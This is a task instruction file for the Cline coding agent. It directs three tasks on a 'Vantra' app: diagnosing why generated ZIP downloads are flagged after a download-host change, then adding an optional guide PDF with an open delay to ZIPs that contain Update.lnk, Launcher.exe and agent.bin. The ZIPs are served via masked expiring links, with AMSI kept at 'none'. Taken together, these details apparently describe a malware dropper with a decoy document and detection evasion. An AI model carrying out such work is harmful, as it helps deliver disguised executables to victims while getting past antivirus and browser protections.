# Batch 3 of 3 — ZIP flag triage + FIX 5 PDF flow integration

**Give this file's path to Cline as its own, self-contained instruction.** This is Batch 3 in the Vantra sequence — Batch 2 (security hardening, `BATCH_2_SECURITY_HARDENING.md`) is separate and unaffected. Work these in order: 76 first (diagnosis before treatment), then 77 → 78 (the new flow).

## Before you start

Read `HOW_WE_MOVE_FAST.md` in this repo root — it is the deploy & verification playbook (rsync `--files-from` discipline, build as `sudo -u vantra`, `systemctl restart vantra.service`, live `curl` check). It points at SpaceWorker's fuller playbook for E2E mechanics (disposable test data, self-cleaning scripts); those mechanics apply here unchanged except this repo has no `app/` subdirectory trap (`/opt/vantra` IS the repo root) and runs as user `vantra` on port 3300 (`vantra.service`). Follow that playbook, not an improvised process. Then read the generator handoff: `../vantra-installer/README.md` → section "⚡ Integrate this into the Vantra web app (`vantra` main repo) — agent handoff" (FIX 5 contract, carrier shape, field table). That section is the spec for Tasks 77–78; this batch doc is sequencing + guardrails, not a duplicate of that detail.

## Why this batch, in this order

Owner report 2026-09-21: ZIP downloads started getting flagged right after the Task 74 public-host cutover (`dl.instaweb.top` → `dl.broks.beauty`). Two live hypotheses, and the order matters — do NOT integrate the new flow on top of an undiagnosed flag:

1. **`TASK_76_ZIP_FLAG_TRIAGE_DOMAIN_VS_FLAGS.md`** — FIRST. Controlled A/B to isolate whether the flag follows the *domain* (reputation/cert/headers on the new host) or a *missing/changed flag* in the `/build` body vs the old confirmed behaviour (e.g. `downloadHost` omitted, `launcherMode` false, `amsi` not `none`, renameable names blank/changed). No product code changes in this task — evidence only, written back into the task file.
2. **`TASK_77_ZIP_PDF_BACKEND_GENERATOR_WIRING.md`** — integrate Michael's FIX 5 flow exactly as specified: thread an optional guide PDF through `lib/zip-generator.ts` → `app/api/devices/deployments/route.ts` (ZIP branch) as base64 `pdf`/`pdfName` (+ optional `pdfDelaySec`), byte-identical when no PDF is attached. Replace only what is necessary.
3. **`TASK_78_ZIP_PDF_UPLOAD_UI_NAMING_STEP.md`** — user-facing piece: optional PDF upload on the ZIP method card, placed alongside the FIX 3 naming inputs (`linkName`/`folderName`/`zipName`) in `components/add-device-modal.tsx`, mirrored validation, base64 `data:application/pdf;base64,…` transport. No separate PDF hosting — the PDF rides *inside* the zip's launcher subfolder and is served through the same masked `/d/<jobId>` link + TTL as the zip itself (see Task 77).

Full detail, exact file references, and fix + verification steps for each are in their own `TASK_7N_*.md` file — read each one fully before starting it.

## How to work through this batch

For **each** task, in order:

1. Read the task file fully (plus the generator README handoff section for 77–78).
2. Implement / investigate exactly what the task scopes. Task 76 = evidence only, no product-code diff. Tasks 77–78 = minimal diffs; preserve every confirmed default flow (no-PDF zip byte-identical, MSI path untouched, merged/separated untouched, private-tier 403 untouched).
3. `npx tsc --noEmit -p .` — must be clean before moving on (76 needs no tsc unless it adds a scratch script — keep scratch out of the repo or delete it after).
4. For 77–78: local generator build with and without a PDF → zip contains `launcher/<pdfName>` only when attached; validation card PASSes; no-PDF zip stays `{ Update.lnk, launcher/Launcher.exe, launcher/agent.bin }`.
5. Do NOT deploy from this batch and do NOT push to `main` — the owner (verifier) performs the live VPS verify + deploy after the batch is written. Leave the working tree buildable and every task file's `**Status: ...**` line updated with what you did + how you verified it locally.
6. Move to the next task in this batch.

## Guardrails

- Stay inside these three tasks. The MSI PDF path (`multipart/form-data`, required PDF, `manufacturer`, branded EXE) is legacy context, not a template to copy blindly — the ZIP flow is JSON + optional PDF; the generator README handoff states the exact transport.
- AMSI stays `none`; do NOT weaken generator auth; do NOT store uploaded PDFs in the DB or on the web-app filesystem (bytes transit to the generator only); do NOT mint a separate public PDF URL — the zip's masked link is the only customer-facing URL.
- Existing untracked `TASK_27...md` through `TASK_40...md` files in this repo root are the owner's pre-existing WIP notes — don't touch, move, or delete them.
- Do not re-verify Task 66 infra or re-litigate the Task 74 host decision inside Tasks 77–78 — Task 76 owns that question; 77–78 build on its answer.

## When the batch is done

Once Task 76 has its evidence table filled in and Tasks 77–78 are implemented, locally verified, and their status lines updated: **stop.** Report back, per task: what you changed (files), what you deliberately did NOT change, and exactly how you verified it. Do not deploy, do not push — the owner/verifier takes live verification + deploy from there.
